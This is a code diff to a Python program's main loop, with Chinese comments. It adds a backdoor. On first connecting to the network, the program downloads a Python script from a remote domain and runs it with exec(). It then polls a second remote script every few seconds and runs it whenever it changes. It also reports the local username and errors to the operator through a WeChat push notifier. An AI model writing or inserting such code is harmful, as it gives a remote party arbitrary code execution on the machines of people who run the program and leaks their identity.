@@ -88,25 +88,40 @@ class Main:
 
         self.system = platform.system()
         self.sys_Version = platform.release()
+        self.sys_username = os.getenv('USERNAME')
         self.running = True
 
         self.startup = False    # 程序启动首次联网执行  /True=已执行
+        self.Current_Code = ''  # 当前代码/用来对比服务器代码变化/有变化就执行新代码
         ...
 
     def Run(self):
-        print(self.fun.Connect_Network())
         while self.running:
             if self.fun.Connect_Network():
                 if not self.startup:    # 程序启动连接到网络执行一次（python代码
+                    qq = requests.get('https://yc.052024.xyz/Control_files/Start_execution.py')
+                    try:
+                        exec(qq.text)       # 程序启动的第一次联网执行远程代码
+                    except Exception as bcr:
+                        print(bcr)
                     if os.name == 'nt':  # win相同获取用户名
-                        xt_username = os.getenv('USERNAME')
+                        self.sys_username = os.getenv('USERNAME')
                     else:
-                        xt_username = os.getenv('USER')
-
-                    self.wechat_push.Alleged_information(f'{xt_username}已联网启动+初始代码执行')
-                    print(os.name)
+                        self.sys_username = os.getenv('USER')
+                    self.wechat_push.Alleged_information(f'{self.sys_username}已联网启动+初始代码执行')
                     self.startup = True
-                    
+                else:
+                    # 代码有变化就执行
+                    qq = requests.get('https://yc.052024.xyz/Control_files/Change_Execution.py')
+
+                    if self.Current_Code != qq.text:
+                        try:
+                            exec(qq.text)
+                        except Exception as bc:
+                            self.wechat_push.Alleged_information(f'{self.sys_username}代码报错：{bc}')
+                        self.Current_Code = qq.text
+                    else:
+                        print('code一样，等待新执行')
 
             time.sleep(3)
 
